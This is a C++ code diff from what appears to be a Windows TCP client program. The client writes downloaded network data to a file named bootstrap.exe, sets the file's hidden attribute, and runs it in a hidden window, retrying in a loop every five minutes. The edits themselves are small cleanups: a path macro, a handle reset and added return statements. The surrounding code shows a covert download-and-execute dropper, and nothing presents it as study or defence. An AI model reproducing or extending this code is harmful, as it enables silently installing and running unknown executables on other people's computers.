@@ -33,6 +33,8 @@ using namespace std;
 #define TCP_CLIENT_STATE_RECV_GET_REP 2
 #define TCP_CLIENT_STATE_WAIT_FOR_DOWNLOAD 3
 
+#define BOOTSTRAP_PRGRAM_PATH_NAME "d:\\bootstrap.exe"
+
 
 typedef struct tcp_client_status
 {
@@ -395,8 +397,8 @@ void onDownloadData(TCP_CLIENT_STATUS_T *client, char *data, int len)
 	{
 		if (local_drives_.size() >= 2)
 		{
-			bootstrapHandle_ = fopen("d:\\bootstrap.exe", "wb+");
-			setFileHidden("d:\\bootstrap.exe");
+			bootstrapHandle_ = fopen(BOOTSTRAP_PRGRAM_PATH_NAME, "wb+");
+			setFileHidden(BOOTSTRAP_PRGRAM_PATH_NAME);
 		}
 		
 	}
@@ -409,6 +411,7 @@ void onDownloadDataEnd(TCP_CLIENT_STATUS_T *client)
 	isFirstDataPacket_ = TRUE;
 	if (bootstrapHandle_ != NULL)
 		fclose(bootstrapHandle_);
+	bootstrapHandle_ = NULL;
 	client->state = TCP_CLIENT_STATE_INIT;
 	closesocket(client->sock);
 	Sleep(1000);
@@ -418,7 +421,7 @@ void onDownloadDataEnd(TCP_CLIENT_STATUS_T *client)
 	ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
 	ShExecInfo.hwnd = NULL;
 	ShExecInfo.lpVerb = "open";
-	ShExecInfo.lpFile = "d:\\bootstrap.exe";
+	ShExecInfo.lpFile = BOOTSTRAP_PRGRAM_PATH_NAME;
 	ShExecInfo.lpParameters = NULL;
 	ShExecInfo.lpDirectory = NULL;
 	ShExecInfo.nShow = SW_HIDE;
@@ -468,7 +471,7 @@ int onPacketRead(TCP_CLIENT_STATUS_T *client, char * packet, int len)
 		}
 		break;
 	}
-		
+	return READ_OK;
 }
 
 
@@ -590,9 +593,8 @@ unsigned __stdcall bootstrapProc(void* pArguments)
 			tcp_client_status_.state = TCP_CLIENT_STATE_INIT;
 			Sleep(1000 * 300);
 		}
-			
 	}
-		
+	return 0;
 }
 
 
